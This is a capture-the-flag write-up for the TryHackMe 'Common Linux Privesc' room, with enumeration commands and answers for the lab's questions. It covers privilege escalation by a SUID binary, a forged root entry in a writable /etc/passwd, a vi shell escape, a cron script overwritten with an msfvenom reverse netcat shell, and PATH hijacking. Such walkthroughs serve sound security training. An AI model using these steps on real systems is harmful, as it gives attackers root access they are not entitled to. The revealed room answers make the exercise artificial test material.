![Common Linux Privesc Banner](https://i.imgur.com/D3pINJ3.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/commonlinuxprivesc/Common_Linux_Privesc_Cover.png" alt="Common Linux Privesc Logo">
</p>

# Common Linux Privesc

This guide contains the answer and steps necessary to get to them for the [Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc) room.

## Table of contents

- [Enumeration](#enumeration)
- [Abusing SUID/GUID Files](#abusing-suid/guid-files)
- [Exploiting Writeable /etc/passwd](#exploiting-writeable-/etc/passwd)
- [Escaping Vi Editor](#escaping-vi-editor)
- [Exploiting Crontab](#exploiting-crontab)
- [Exploiting PATH Variable](#exploiting-path-variable)

### Enumeration

Just realized we were supposed to answers these questions using `linenum`. So after transferring and running the scripts you can find the answers as well.

1. First, lets SSH into the target machine, using the credentialsuser3:password.This is to simulate getting a foothold on the system as a normal privilege user.

2. What is the target's hostname?

   After logging into the system with ssh, we can get more info on the system using:

   ```console
   uname -a
   ```

   ENUM USERS

   ><details><summary>Click for answer</summary>polobox</details>

3. Look at the output of /etc/passwd how many "user[x]" are there on the system?

   We can output the contents of `/etc/passwd` and filter on `user`.

   ```console
   cat /etc/passwd | grep user
   ```

   ENUM USERS

   ><details><summary>Click for answer</summary>8</details>

4. How many available shells are there on the system?

   To find this, we can simply look at the `/etc/shells` file.

   ```console
   cat /etc/shells
   ```

   ENUM SHELLS

   ><details><summary>Click for answer</summary>4</details>

5. What is the name of the bash script that is set to run every 5 minutes by cron?

   To find the active cronjobs on the machine we can use:

   ```console
   cat /etc/crontab
   ```

   ENUM CRON

   ><details><summary>Click for answer</summary>autoscript.sh</details>

6. What critical file has had its permissions changed to allow some users to write to it?

   We can find this in multiple ways. One way is assuming the file has write permission set for groups. And assuming the file is located in /etc/.

   ```console
   find /etc -maxdepth 1 -perm -g+w
   ```

   ENUM WRITE

   ><details><summary>Click for answer</summary>/etc/passwd</details>

7. Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!

### Abusing SUID/GUID Files

1. What is the path of the file in user3's directory that stands out to you?

   Looking at the SUID files from linenum, we can see which file has the suid bit set in user3's directory.

   SUID FILE

   Running it we can indeed see we are now root.

   SUID ROOT

   ><details><summary>Click for answer</summary>/home/user3/shell</details>

2. We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it!We can do this by running:"./shell"

3. Congratulations! You should now have a shell as root user, well done!

### Exploiting Writeable /etc/passwd

1. First, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user7, with the password"password"

2. Having read the information above, what direction privilege escalation is this attack?

   The answer can be found in the text above.

   ><details><summary>Click for answer</summary>Vertical</details>

3. Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command:"openssl passwd -1 -salt [salt] [password]"What is the hash created by using this command with the salt,"new"and the password"123"?

   Using `openssl` we get the following hash:

   ```console
   openssl passwd -1 -salt new 123
   ```

   PASSWD HASH

   ><details><summary>Click for answer</summary>$1$new$p7ptkEKU1HnaHpRtzNizS1</details>

4. Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

   We must combine several things here.

   - The username
   - The password hash
   - The UID and GID (both 0 for root)
   - Description (can be root)
   - Home folder (again root/ for root)
   - Shell path (/bin/bash)

   ><details><summary>Click for answer</summary>new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:root/:/bin/bash</details>

5. Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!

6. Now, use"su"to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!

   PASSWD ROOT

### Escaping Vi Editor

1. First, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user8, with the password"password"



   ><details><summary>Click for answer</summary></details>

2. Let's use the"sudo -l"command, what does this user require (or not require) to run vi as root?



   ><details><summary>Click for answer</summary></details>

3. So, all we need to do is open vi as root, by typing"sudo vi"into the terminal.



   ><details><summary>Click for answer</summary></details>

4. Now, type":!sh"to open a shell!



   ><details><summary>Click for answer</summary></details>

### Exploiting Crontab

1. First, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user4, with the password"password"



   ><details><summary>Click for answer</summary></details>

2. Now, on our host machine- let's create a payload for our cron exploit using msfvenom.



   ><details><summary>Click for answer</summary></details>

3. What is the flag to specify a payload in msfvenom?



   ><details><summary>Click for answer</summary></details>

4. Create a payload using:"msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"



   ><details><summary>Click for answer</summary></details>

5. What directory is the "autoscript.sh" under?



   ><details><summary>Click for answer</summary></details>

6. Lets replace the contents of the file with our payload using:"echo [MSFVENOM OUTPUT] > autoscript.sh"



   ><details><summary>Click for answer</summary></details>

7. After copying the code into autoscript.sh 
file we wait for cron to execute the file, and start our netcat listener using:"nc -lvnp 8888"and wait for our shell to land!



   ><details><summary>Click for answer</summary></details>

8. After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!



   ><details><summary>Click for answer</summary></details>

### Exploiting PATH Variable

1. Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing"exit". Then use"su"to swap to user5, with the password"password"



   ><details><summary>Click for answer</summary></details>

2. Let's go to user5's home directory, and run the file"script". What command do we think that it's executing?



   ><details><summary>Click for answer</summary></details>

3. Now we know what command to imitate, let's change directory to"tmp".



   ><details><summary>Click for answer</summary></details>

4. Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:echo "[whatever command we want to run]" > [name of the executable we're imitating]What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating



   ><details><summary>Click for answer</summary></details>

5. Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?



   ><details><summary>Click for answer</summary></details>

6. Now, we need to change the PATH variable, so that it points to the directory where we have our imitation"ls"stored! We do this using the command"export PATH=/tmp:$PATH"Note, this will cause you to open a bash prompt every time you use"ls". If you need to use"ls"before you finish the exploit, use"/bin/ls"where the real"ls"executable is.Once you've finished the exploit, you can exit out of root and use"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH"to reset the PATH variable back to default, letting you use"ls"again!



   ><details><summary>Click for answer</summary></details>

7. Now, change directory back to user5's home directory.



   ><details><summary>Click for answer</summary></details>

8. Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!



   ><details><summary>Click for answer</summary></details>

